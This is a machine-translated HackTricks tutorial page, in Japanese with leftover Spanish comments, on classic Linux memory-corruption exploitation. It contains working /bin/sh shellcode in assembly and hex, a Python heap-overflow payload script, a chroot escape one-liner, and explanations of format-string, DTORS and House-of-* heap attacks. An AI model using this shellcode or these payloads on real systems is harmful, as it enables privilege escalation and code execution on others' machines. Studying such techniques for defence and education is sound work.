# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているかを確認するには、前述のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際にトリックを使用することができます。最初の命令はcallにジャンプするものです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。call命令の後に必要な文字列を入れており、そのEIPを使用して文字列を指し示し、さらにコードを実行できます。

例 **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stackを使用したEJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

プロセスに関連付けられたメモリページをスキャンし、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードをインジェクトするための小さなスペースしかない場合に便利です。

**Polymorphic Shellcodes**

これは、暗号化されたシェルで、それを復号化してジャンプする小さなコードを持っており、Call-Popトリックを使用しています。これは**シーザー暗号の暗号化例**です。
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.補足手法**

**Ret2Ret**

EIPにスタックのアドレスを入れることができない場合（EIPが0xbfを含まないことが確認されている場合）や、shellcodeの場所を計算できない場合に便利です。ただし、脆弱な関数が1つのパラメータを受け入れる場合（ここにshellcodeが配置されます）。

したがって、EIPを**ret**のアドレスに変更すると、次のアドレス（関数の最初の引数のアドレス）がロードされます。つまり、shellcodeがロードされます。

Exploitは次のようになります：SHELLCODE + パディング（EIPまで）+ **\&ret**（スタックに渡されたアドレスがshellcodeの開始を指すため、スタックの次のバイトがロードされます）

**Muratのテクニック**

Linuxでは、すべてのプログラムが0xbfffffffからマップされます。

Linuxの新しいプロセスのスタックがどのように構築されるかを見ると、プログラムがshellcodeのみの環境で起動されるようにExploitを開発できます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

これにより、shellcodeを含む環境変数のアドレスを簡単に取得できます。

これは、execle関数が望む環境変数のみを持つ環境を作成できるため可能です。

**ESPへのジャンプ：Windowsスタイル**

ESPが常にスタックの先頭を指しているため、この手法はEIPを**jmp esp**または**call esp**のアドレスに置き換えることで機能します。これにより、EIPの上書き後にshellcodeが保存され、**ret**を実行した後、ESPは次のアドレスを指すようになり、ちょうどshellcodeが保存されている場所になります。

WindowsまたはLinuxでASLRが無効になっている場合、共有オブジェクトに保存された**jmp esp**または**call esp**を呼び出すことができます。ASLRが有効な場合、脆弱なプログラム内で検索することができます。

さらに、EIPの破損後にshellcodeを配置できるため、関数のスタックの中央に配置する代わりに、pushやpop命令がshellcodeに触れないようにすることができます。

同様に、関数がshellcodeが保存されているアドレスを返すことがわかっている場合、**call eax**または**jmp eax (ret2eax)**を呼び出すことができます。

**整数オーバーフロー**

この種のオーバーフローは、変数が渡される数値をサポートする準備ができていない場合に発生します。符号付きと符号なしの変数の混乱による可能性があります。
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
前の例では、プログラムが2つのパラメータを期待していることがわかります。最初のパラメータは次の文字列の長さであり、2番目のパラメータは文字列です。

最初のパラメータに負の数を渡すと、len < 256 と表示され、そのフィルターを通過します。さらに、strlen(buffer) も l より小さくなります。なぜなら、l は unsigned int であり、非常に大きいからです。

この種のオーバーフローは、プログラムのプロセスに何かを書き込むことを目指すのではなく、他の脆弱性を悪用するために設計されたフィルターを回避することを目的としています。

**初期化されていない変数**

初期化されていない変数が取る値はわからず、それを観察することが興味深いかもしれません。前の関数の変数が取っていた値を取る可能性があり、その変数が攻撃者によって制御される可能性があります。

##

###

###

###

### **.fini\_array**

基本的には、プログラムが終了する前に呼び出される**関数が含まれる構造**です。これは、**アドレスにジャンプして shellcode を呼び出す**ことができる場合や、フォーマット文字列を**2回目に悪用するために再び main に戻る**必要がある場合に興味深いです。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意：これは**永久ループ**を作成しません。なぜなら、mainに戻るとキャナリが検知し、スタックの末尾が破損している可能性があり、関数が再度呼び出されなくなるからです。したがって、これにより脆弱性の**1回の実行**が可能になります。

### **コンテンツをダンプするためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
たとえば、次の状況では、**フラグを指すスタック内のローカル変数**があります。**メモリ**のどこに**フラグへのポインタ**があるかを**見つける**と、**printf**がその**アドレス**にアクセスして**フラグ**を**表示**できます。

したがって、フラグは**0xffffcf4c**にあります

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目**のパラメータにあることがわかります：

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすると、フラグを取得できます：

![](<../../.gitbook/assets/image (624).png>)

**前の攻撃**に続いて**コンテンツを漏洩**できることに気付いた場合、**`printf`**へのポインタを**実行可能ファイルがロードされるセクション**に**設定**して、それを**完全にダンプ**することができます！

### **DTOR**

{% hint style="danger" %}
現在、dtorセクションを持つバイナリを見つけるのは非常に**珍しい**です。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
**`__DTOR_END__`**に**シェルコード**の**アドレス**を**書き込む**ことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR**セクションは値`ffffffff`と`00000000`の間にあります。そのため、これらの値だけを見ると、**登録された関数がない**ことを意味します。したがって、**`00000000`**を**シェルコードのアドレス**で**上書き**して、それを実行します。

### **バッファオーバーフローへのフォーマット文字列**

**sprintf**はフォーマットされた文字列を**変数に移動**します。したがって、文字列の**フォーマット**を悪用して、コピーされる変数で**バッファオーバーフロー**を引き起こすことができます。\
例えば、ペイロード`%.44xAAAA`は、変数に44B+"AAAA"を**書き込む**ため、バッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在はこれを**悪用するのは非常に珍しい**です。
{% endhint %}

**`atexit()`**は、**他の関数がパラメーターとして渡される**関数です。これらの**関数**は、**`exit()`の実行**または**mainの戻り**時に**実行**されます。\
たとえば、これらの**関数**の**アドレス**をシェルコードを指すように**変更**できれば、**プロセスを制御**できますが、現在はこれがより複雑になっています。\
現在、**実行される関数のアドレス**は、いくつかの構造体の背後に隠されており、最終的にそれが指すアドレスは関数のアドレスではなく、**XOR**と**ランダムキー**で暗号化されています。そのため、現在、この攻撃ベクトルは**x86**および**x64\_86**ではあまり有用ではありません。\
**暗号化関数**は**`PTR_MANGLE`**です。 m68k、mips32、mips64、aarch64、arm、hppaなどの**他のアーキテクチャ**は、**入力と同じものを返す**ため、このベクトルによって攻撃される可能性があります。

### **setjmp() & longjmp()**

{% hint style="danger" %}
現在はこれを**悪用するのは非常に珍しい**です。
{% endhint %}

**`Setjmp()`**は、**コンテキスト（レジスタ）を保存**できます。\
**`longjmp()`**は、**コンテキストを復元**できます。\
保存されるレジスタは、`EBX、ESI、EDI、ESP、EIP、EBP`です。\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されるため、この攻撃に対して脆弱なアーキテクチャは上記と同じです。\
エラー回復や割り込みに役立ちます。\
ただし、他のレジスタは保護されていないという情報もありますので、関数内で`call ebx`、`call esi`、`call edi`がある場合、制御を取得できます。または、ESPを変更してEBPを変更することもできます。

**VTableとVPTR in C++**

各クラスには、メソッドへのポインタの配列である**Vtable**があります。

各**クラス**のオブジェクトには、そのクラスの配列への**ポインタ**である**VPtr**があります。 VPtrは各オブジェクトのヘッダーの一部です。したがって、VPtrを**上書き**すると、実行される関数がシェルコードに移動する可能性があります。

## **予防措置と回避策**

###

**Libsafeの置換**

次で有効になります: LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

いくつかの危険な関数呼び出しを安全な関数に置き換えます。標準化されていません（x86専用、-fomit-frame-pointerでのコンパイル、静的コンパイルでは機能せず、すべての脆弱な関数が安全になるわけではなく、LD\_PRELOADはsetuidバイナリでは機能しません）。

**ASCIIアーマードアドレススペース**

共有ライブラリを0x00000000から0x00ffffffにロードして、常に0x00のバイトがあるようにします。ただし、これはほとんどすべての攻撃を防ぐことはできず、リトルエンディアンではなおさらです。

**ret2plt**

strcpy@plt関数（pltから）を呼び出し、GOTのエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーするようにROPを実行することです。その後、GOT+1を指すように同じことを繰り返し、system()の2番目のバイトをコピーします。最後に、GOTに保存されたアドレス（system()であるはず）を呼び出します。

**chroot()によるジェイル**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします

管理者は、これらのジェイルから抜け出すことができます: mkdir foo; chroot foo; cd ..

**コードインストゥルメンテーション**

Valgrind —> エラーを検索します\
Memcheck\
RAD（Return Address Defender）\
Insure++
**シェルコード = "\xeb\x0caaaabbbbcccc" #jm 12 + 12バイトのパディング**

**シェルコード += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #前のチャンクが空きであることを示すビットが1であることが重要**

**fake\_size = pack("\<I”, 0xfffffffc) #-4、3番目のチャンクの "size" が4バイト手前にあると思わせるため（2番目のチャンクが空きかどうかを確認する場所）**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ペイロードの最初に8バイトのパディングを追加**

**got\_free = pack("\<I", 0x08048300 - 12) #plt内のfree()のアドレス-12（2回目のfree()呼び出し時にシェルコードが実行されるアドレスが上書きされるアドレス）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #前述のように、ペイロードは8バイトのパディングで始まる**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2番目のチャンクを変更し、got\_freeはaddr\_sc + 12のアドレスを保存する場所を指す**

**os.system("./8.3.o " + payload)**

**unset()（逆順で解放する）（wargame）**

3つの連続したチャンクを制御し、逆の順序で解放される。

その場合：

チャンクcにシェルコードを配置する

チャンクaは、サイズのPREV\_INUSEビットがオフになっているようにbを上書きするために使用され、チャンクaが空きであると思わせる。

さらに、ヘッダーbのサイズを-4に上書きする。

その結果、プログラムは「a」が空きであり、バイナリにあると思い、それを解除するためにunlink()を呼び出します。ただし、ヘッダーPREV\_SIZEが-4であるため、「a」のチャンクが実際にはb+4から始まると考えます。つまり、b+4でunlink()が実行され、b+12にはポインター「fd」があり、b+16にはポインター「bk」があります。

したがって、bkにシェルコードのアドレスを、fdに「puts()」-12のアドレスを配置すると、ペイロードが完成します。

**Frontlink技術**

何も連続していないチャンクが解放されると、unlink()ではなく直接frontlink()が呼び出されます。

攻撃されるmallocが決して解放（free()）されない場合に有用な脆弱性。

必要なもの：

データ入力関数でオーバーフローする可能性のあるバッファ

これに隣接する解放されるバッファで、前のバッファのオーバーフローによってそのヘッダーのfdフィールドが変更される

512より大きく、前のバッファより小さいサイズの解放されるバッファ

この前述のステップ3より前に宣言されたバッファで、このバッファのprev\_sizeを上書きできる

これにより、2つのmallocを制御された方法で上書きし、1つだけが解放されるが、エクスプロイトを実行できます。

**ダブルフリー脆弱性**

同じポインターで2回free()が呼び出されると、2つのbinが同じアドレスを指すようになります。

1つを再利用する場合は問題ありません。もう1つを使用しようとすると、前の予約が書き込むデータでfdとbkポインターが誤った値になります。

**free()の後**

以前に解放されたポインターが制御なしに再度使用されます。

## **8ヒープオーバーフロー：高度なエクスプロイト**

unlink()およびfrontlink()の技術は、unlink()関数を変更することで削除されました。

**The house of mind**

コードの任意の実行を引き起こすには、1回のfree()呼び出しが十分です。オーバーフローされた前のトロゾによって解放される可能性がある2番目のトロゾを見つけることが重要です。

free()の呼び出しはpublic\_fREe(mem)を呼び出します。これは次のように動作します：

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> トロゾが始まるアドレス（mem-8）へのポインターを返す

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1\]では、サイズフィールドとNON\_MAIN\_ARENAビットを確認し、このチェックがtrueを返すように変更でき、heap\_for\_ptr()が実行されます。これにより、"mem"にAND演算が適用され、最も重要でない2.5バイトが0になります（0x0804a000の場合、0x08000000になります）、そして0x08000000->ar\_ptr（struct heap\_infoのように見える）にアクセスします。

したがって、たとえば0x0804a000にトロゾを制御し、0x081002a0にトロゾを解放する場合、0x08100000に到達し、たとえば0x0804a000を書き込むことができます。この2番目のトロゾが解放されると、heap\_for\_ptr(ptr)->ar\_ptrが0x08100000に書き込んだ内容を返します（0x081002a0にAND演算が適用され、そこから最初の4バイトの値、ar\_ptrが取得されるため）。

_int\_free(ar\_ptr, mem)が呼び出されるため、\_int\_free(0x0804a000, 0x081002a0)が実行されます。\
\_int\_free(mstate av, Void\_t\* mem){\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

前述のように、avの値を制御できるため、解放されるトロゾに書き込んだ値に従って処理が進みます。

unsorted\_chunksがどのように定義されているかを考えると、次のことがわかります：\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

したがって、av->bins\[2\]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_に2番目のトロゾのアドレスが書き込まれます。

つまり、最初のトロゾの先頭に\_\_DTOR\_END\_\_-12のアドレスを何度も配置する必要があります。av->bins\[2\]が取得するためです。

2番目のトロゾのアドレスが最後の5桁の0であるアドレスに、最後にはシェルコードを配置します。

このようにして、\_int\_free(TROZO1, TROZO2)が呼び出され、\_\_DTOR\_END\_\_にTROZO2のprev\_sizeのアドレスが書き込まれ、シェルコードが実行されます。
この技術を適用するには、ペイロードを少し複雑にするいくつかの要件を満たす必要があります。

この技術はもはや適用できません。unlink とほぼ同じパッチが適用されました。新しいサイトが自身を指しているかどうかを比較します。

**Fastbin**

The house of mind のバリエーションです。

次のコードを実行することが重要で、これは \_int\_free() 関数の最初のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

これにより、"fb" には GOT 内の関数のアドレスが入ります。このアドレスには上書きされるチャンクのアドレスが入ります。これには、アリーナが dtors のアドレスに近い必要があります。具体的には、av->max\_fast が上書きされるアドレスにある必要があります。

The House of Mind では、av の位置を制御できることがわかりました。

したがって、size フィールドに 8 + NON\_MAIN\_ARENA + PREV\_INUSE のサイズを設定すると、fastbin\_index() は fastbins\[-1] を返し、これは av->max\_fast を指します。

この場合、av->max\_fast が上書きされるアドレスになります（指すアドレスではなく、上書きされる位置です）。

さらに、解放されたチャンクの隣接するチャンクのサイズが 8 より大きい必要があります。解放されたチャンクのサイズが 8 であると述べたため、この偽のチャンクには 8 より大きいサイズを設定するだけで十分です（さらに、シェルコードは解放されたチャンクに配置されるため、最初に nops に落ちる jmp を設定する必要があります）。

さらに、同じ偽のチャンクは av->system\_mem より小さくなければなりません。av->system\_mem はその位置よりも 1848 バイト先にあります。

\_DTOR\_END\_ の null と GOT 内のアドレスが少ないため、これらのセクションのどのアドレスも上書きに適していません。そのため、fastbin を使用してスタックを攻撃する方法を見てみましょう。

もう一つの攻撃方法は、**av** をスタックにリダイレクトすることです。

size を 8 ではなく 16 に変更すると、fastbin\_index() は fastbins\[0] を返し、これを使用してスタックを上書きできます。

これには、スタックにキャナリや奇妙な値が含まれていない必要があります。実際、このような構造が必要です：4 バイトの null + EBP + RET

4 バイトの null が必要なのは、**av** がこのアドレスにある必要があり、**av** の最初の要素は値が 0 である必要があるためです。

**av->max\_fast** は EBP になり、これは制約をスキップするための値になります。

**av->fastbins\[0]** は **p** のアドレスで上書きされ、RET になり、これによりシェルコードにジャンプします。

さらに、**av->system\_mem**（スタック上の位置から 1484 バイト上にある）には、スキップされる可能性のある多くのゴミが含まれており、これにより行われるチェックをスキップできます。

解放されたチャンクの隣接するチャンクのサイズが 8 より大きい必要があります。解放されたチャンクのサイズが 16 であると述べたため、この偽のチャンクには 8 より大きいサイズを設定するだけで十分です（さらに、シェルコードは解放されたチャンクに配置されるため、新しい偽のチャンクのサイズのフィールドの後にある nops にジャンプする jmp を設定する必要があります）。

**The House of Spirit**

この場合、攻撃者が変更可能な malloc のポインタを持つ malloc を持つことが重要です（例：ポインタがオーバーフロー可能な変数の下のスタックにある場合）。

したがって、このポインタを任意の場所に指すことができます。ただし、どの場所でも有効ではありません。偽のチャンクのサイズは av->max\_fast より小さく、より具体的には将来の malloc() の呼び出しで要求されるサイズに 8 を加えたものと等しくする必要があります。したがって、たとえばプログラムがユーザーに数値を尋ねる場合、48 を入力し、malloc の変更可能なポインタを次の 4 バイトに指すことができます（これらは EBP に属する可能性があります。したがって、48 は後方に残り、サイズフィールドのように見えます）。さらに、ptr-4+48 のアドレスにはいくつかの条件を満たす必要があります（この場合、ptr=EBP です）。つまり、8 < ptr-4+48 < av->system\_mem です。

これが満たされると、次に malloc が呼び出されると、malloc(40) と言った次の malloc に EBP のアドレスが割り当てられます。攻撃者がこの malloc で書き込むこともできる場合、EBP と EIP の両方を任意のアドレスで上書きできます。

これは、free() がスタックの EBP を指すアドレスに完璧なサイズのチャンクがあることを覚えておくためです。したがって、そのアドレスが割り当てられます。

**The House of Force**

必要なもの：

* wilderness を上書きできるチャンクへのオーバーフロー
* ユーザーが定義したサイズでの malloc() の呼び出し
* ユーザーが定義したデータでの malloc() の呼び出し

最初に行うことは、wilderness チャンクのサイズを非常に大きな値（0xffffffff）で上書きすることです。これにより、十分に大きなメモリ要求があれば、ヒープを拡張する必要がなくなります。

次に、av->top を、スタックなどの攻撃者の制御下にあるメモリ領域を指すように変更します。av->top には \&EIP - 8 が入ります。

av->top を攻撃者の制御下のメモリ領域を指すように上書きする必要があります：

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim は現在の wilderness チャンクのアドレスを収集し、remainder はそのアドレスに malloc() によって要求されたバイト数を追加したものです。したがって、\&EIP-8 が 0xbffff224 にあり、av->top が 0x080c2788 を含んでいる場合、次の malloc が \&EIP-8 を指すようにするために制御された malloc で予約する必要があるバイト数は次のようになります：

0xbffff224 - 0x080c2788 = 3086207644.

これにより、av->top に変更された値が保存され、次の malloc が EIP を指し、上書きできるようになります。

新しい wilderness チャンクのサイズが、最後の malloc() による要求よりも大きい必要があります。つまり、wilderness が \&EIP-8 を指している場合、サイズはスタックの EBP のフィールドにちょうど残ります。

**The House of Lore**

**SmallBin の破損**

解放されたチャンクはサイズに応じて bin に挿入されます。しかし、それらを bin に挿入する前に、unsorted bins に保存されます。チャンクが解放されると、すぐに bin に挿入されるのではなく、unsorted bins に残ります。次に、新しいチャンクが予約され、前の解放されたチャンクが役立つ場合はそれが返されますが、より大きなチャンクが予約されると、unsorted bins にある解放されたチャンクが適切な bin に挿入されます。

脆弱なコードに到達するには、メモリ要求が av->max\_fast（通常は 72）より大きく、MIN\_LARGE\_SIZE（512）より小さい必要があります。

bin に適切なサイズのチャンクがある場合、それを解除してから返します：

bck = victim->bk; 前のチャンクを指します。これを変更できる唯一の情報です。

bin->bk = bck; 前から 2 番目のチャンクが最後になります。bck がスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; リストを閉じ、これを bin に指します。

必要なもの：
## **基本的なESPの利用**

攻撃者が選択したアドレスを持つmallocが攻撃者によって制御されるように、2つのmallocが予約される。

攻撃目標は、解放されたbin内にオーバーフローを行うことができるヒープにオーバーフローを行うことです。解放されたbin内の最初のチャンクがリストの最初になり、予約されると、binは次に提供されるリストの最後のチャンクが攻撃者が設定した偽のアドレス（スタックまたはGOTなど）にあると信じ込まされます。そのため、別のチャンクが再度予約され、攻撃者がそのチャンクにアクセス権を持っている場合、望ましい位置にチャンクが提供され、その位置に書き込むことができます。

修正されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクが予約される必要があります。これにより、修正されたチャンクがunsorted binsから出て、そのbinに挿入されます。

binが再度使用されるまでmalloc()が十分に呼び出されるのを待つ必要があります。そして、修正されたbinを使用し、binを欺いて次のチャンクが偽のアドレスにあると信じ込ませます。そして、望ましいチャンクが提供されます。

この攻撃をできるだけ早く実行するためには、脆弱なチャンクを予約し、修正されるチャンクを予約し、そのチャンクを解放し、修正されるチャンクよりも大きなチャンクを予約し、チャンク（脆弱性）を修正し、脆弱なチャンクと同じサイズのチャンクを予約し、2番目のチャンクを予約し、そのチャンクが攻撃者が選択したアドレスを指すようにします。

この攻撃を防ぐために、通常のチェックが使用されます。つまり、bck->fdがvictimを指していないことを確認します。つまり、スタックに指された偽のチャンクのfdポインタがvictimを指しているかどうかを確認します。この保護を回避するには、攻撃者は適切なアドレスにvictimのアドレスをいかなる方法で書き込む必要があります。これにより、それが本物のチャンクであるかのように見えるようになります。

## **LargeBinの破損**

以前と同じ要件が必要で、さらに、予約されたチャンクは512よりも大きくなければなりません。

攻撃は前述のものと同じですが、修正されたチャンクのサイズを変更する必要があります。つまり、そのサイズ - nbがMINSIZEよりも小さくなければなりません。

例えば、サイズを1552に設定すると、1552 - 1544 = 8 < MINSIZEとなります（負にならないようにするためにunsignedが比較されます）。

さらに、攻撃をより複雑にするためのパッチが導入されています。

## **ヒープスプレー**

基本的には、ヒープのすべてのメモリを予約し、これらをnopsのパディングで埋め、最後にシェルコードで終了させることです。パディングとして0x0cが使用されます。つまり、アドレス0x0c0c0c0cにジャンプしようとし、このパディングで呼び出されるアドレスが上書きされる場合、そこにジャンプします。基本的には、ポインタが上書きされる可能性があるかどうかを確認するために、できるだけ多くを予約し、0x0c0c0c0cにジャンプし、そこにnopsがあることを期待する戦術です。

## **ヒープ風水**

予約と解放を繰り返すことで、空きチャンクの間に予約されたチャンクが残るようにメモリを配置することです。オーバーフローするバッファはそのうちの1つに配置されます。
